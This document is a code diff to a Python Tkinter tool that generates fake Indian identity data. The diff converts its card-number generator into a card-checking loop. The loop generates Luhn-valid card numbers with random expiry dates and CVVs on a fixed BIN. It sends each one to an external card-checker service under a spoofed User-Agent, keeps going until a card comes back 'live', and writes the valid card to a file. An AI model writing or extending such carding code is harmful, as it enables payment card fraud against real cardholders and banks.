@@ -6,6 +6,9 @@ Generator window for India data.
 import tkinter as tk
 import random
 import pyperclip
+import threading
+import requests
+import time
 from datetime import datetime
 from faker import Faker
 
@@ -44,31 +47,43 @@ def show_in_window(parent, theme_name="light"):
     postcode_val = tk.StringVar()
     addr_en_val = tk.StringVar()
 
-    def generate_card():
-        prefix = "55182706"
-        temp_digits = [int(d) for d in prefix]
-        for _ in range(7):
-            temp_digits.append(random.randint(0, 9))
+    def generate_luhn_number(bin_number):
+        digits = [int(d) for d in str(bin_number)]
+        while len(digits) < 15:
+            digits.append(random.randint(0, 9))
 
-        checksum = 0
-        for i, d in enumerate(temp_digits):
+        sum_ = 0
+        for i, digit in enumerate(reversed(digits)):
             if i % 2 == 0:
-                val = d * 2
-                if val > 9:
-                    val -= 9
-                checksum += val
-            else:
-                checksum += d
+                digit *= 2
+                if digit > 9:
+                    digit -= 9
+            sum_ += digit
+        check_digit = (10 - (sum_ % 10)) % 10
+        digits.append(check_digit)
+        return "".join(map(str, digits))
 
-        check_digit = (10 - (checksum % 10)) % 10
-        card_num = "".join(map(str, temp_digits)) + str(check_digit)
-
-        month = random.randint(1, 12)
-        year = datetime.now().year + random.randint(1, 5)
-        exp_date = f"{month:02d}/{str(year)[-2:]}"
+    def generate_virtual_card(bin_val):
+        number = generate_luhn_number(bin_val)
+        month = f"{random.randint(1, 12):02d}"
+        year = random.randint(2025, 2030)
         cvv = f"{random.randint(100, 999)}"
+        return number, month, year, cvv
 
-        return card_num, exp_date, cvv
+    def check_card(card_details):
+        url = "https://api.chkr.cc/"
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        }
+        payload = {"data": card_details}
+        try:
+            response = requests.post(url, headers=headers, json=payload, timeout=15)
+            if response.status_code == 200:
+                return response.json()
+            return None
+        except:
+            return None
 
     def generate_eng_address():
         cities = [
@@ -107,16 +122,79 @@ def show_in_window(parent, theme_name="light"):
         bldg = random.randint(1, 999)
         return f"{bldg}, {street}, {area}, {city}, India"
 
+    is_searching = False
+    stop_event = threading.Event()
+
+    def search_live_card_thread(bin_val):
+        nonlocal is_searching
+        attempt = 0
+        while not stop_event.is_set():
+            attempt += 1
+            number, month, year, cvv = generate_virtual_card(bin_val)
+            card_details = f"{number}|{month}|{year}|{cvv}"
+            
+            # Обновление UI: пока идем поиск
+            def update_status(att, c_det):
+                card_val.set(f"Ищем [{att}]...")
+                exp_val.set(c_det)
+                cvv_val.set("...")
+            
+            win.after(0, update_status, attempt, card_details)
+            
+            result = check_card(card_details)
+            if result and isinstance(result, dict):
+                status = result.get('status', '').lower()
+                msg = result.get('message', '')
+                if status == "live":
+                    # Нашли карту!
+                    def found_card(n, m, y, c):
+                        card_val.set(n)
+                        exp_val.set(f"{m}/{str(y)[-2:]}")
+                        cvv_val.set(c)
+                        toggle_search_btn(False)
+                    win.after(0, found_card, number, month, year, cvv)
+                    
+                    # Сохраняем в файл
+                    try:
+                        with open("found_live.txt", "a", encoding="utf-8") as f:
+                            f.write(f"{card_details} | {msg} | {time.ctime()}\n")
+                    except:
+                        pass
+                    
+                    break
+            
+            time.sleep(1)
+        
+        if is_searching: # if loop ended normally without unsetting is_searching
+            win.after(0, lambda: toggle_search_btn(False))
+
+    def toggle_search_btn(searching):
+        nonlocal is_searching
+        is_searching = searching
+        if searching:
+            generate_btn.config(text="⏹ Остановить", bg="#dc2626", fg="white")
+        else:
+            generate_btn.config(text="🔄 Сгенерировать", bg=accent_bg, fg=accent_fg)
+
     def refresh_data():
+        nonlocal is_searching
+        if is_searching:
+            stop_event.set()
+            toggle_search_btn(False)
+            return
+
+        is_searching = True
+        stop_event.clear()
+        toggle_search_btn(True)
+
         name_val.set(fake_in.name())
-        c_num, c_exp, c_cvv = generate_card()
-        card_val.set(c_num)
-        exp_val.set(c_exp)
-        cvv_val.set(c_cvv)
         city_val.set(fake_in.city())
         street_val.set(f"{fake_in.street_name()} {fake_in.building_number()}")
         postcode_val.set(fake_in.postcode())
         addr_en_val.set(generate_eng_address())
+        
+        # Start search thread with the prefix
+        threading.Thread(target=search_live_card_thread, args=("55182706",), daemon=True).start()
 
     row_widgets = {}
     highlight_bg = "#f59e0b"
@@ -199,6 +277,7 @@ def show_in_window(parent, theme_name="light"):
     ]
 
     def on_close():
+        stop_event.set()
         for k in _in_window_keys:
             hotkey_settings._callbacks.pop(k, None)
         hotkey_settings.register_all()
@@ -301,7 +380,7 @@ def show_in_window(parent, theme_name="light"):
     btn_frame_win = tk.Frame(content_frame, bg=colors["bg"])
     btn_frame_win.grid(row=r, column=0, columnspan=3, pady=20)
 
-    tk.Button(
+    generate_btn = tk.Button(
         btn_frame_win,
         text="🔄 Сгенерировать",
         command=refresh_data,
@@ -309,7 +388,8 @@ def show_in_window(parent, theme_name="light"):
         fg=accent_fg,
         font=("Arial", 10, "bold"),
         padx=10,
-    ).pack(side=tk.LEFT, padx=5)
+    )
+    generate_btn.pack(side=tk.LEFT, padx=5)
 
     tk.Button(
         btn_frame_win,
